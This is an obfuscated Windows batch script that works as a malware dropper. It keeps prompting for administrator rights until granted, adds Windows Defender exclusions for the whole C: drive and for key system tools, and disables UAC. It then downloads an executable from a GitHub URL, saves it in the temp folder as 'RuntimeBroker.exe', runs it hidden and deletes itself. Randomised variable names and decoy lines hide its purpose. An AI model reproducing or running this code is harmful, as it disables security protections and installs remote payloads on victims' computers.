@echo off & setlocal enableDelayedExpansion
set "DBuwm=2>&1" & set "Rwuv=SESSION" & set "OZn=>nul" & set "wmi=NET"
%wmi% %Rwuv% %OZn% %DBuwm%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "NTKo=bar" & set "lnwM=qux" & set "PtE=foo" & set "uldOs=baz" & rem UOQUinm jYMcy QpND
set "YvGnZ=powershell -ExecutionPolicy Bypass -Command"
set "tXHps=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "Big='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "Njs='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!YvGnZ! "!tXHps! !Big! !Njs!" %OZn% %DBuwm%
set "DiKSp=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "TEtl=-Name 'EnableLUA' -Value 0"
!YvGnZ! "!DiKSp! !TEtl!" %OZn% %DBuwm%
set "xAzlv=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!YvGnZ! "!xAzlv!" %OZn% %DBuwm%
if !errorlevel! neq 0 (goto %a%)
set "MDIO=timeout /t" & !MDIO! 2 %OZn% %DBuwm%
set "IuQ=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "LtY=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "nkmsC=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!YvGnZ! "!IuQ! !LtY! !nkmsC!" %OZn% %DBuwm%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!MDIO! 1 %OZn% %DBuwm% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %OZn% %DBuwm%
del /f /q "%~f0" %OZn% %DBuwm%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %OZn% %DBuwm%
if !errorlevel! neq 0 (!MDIO! 3 %OZn% %DBuwm% & goto %b%)
exit /b
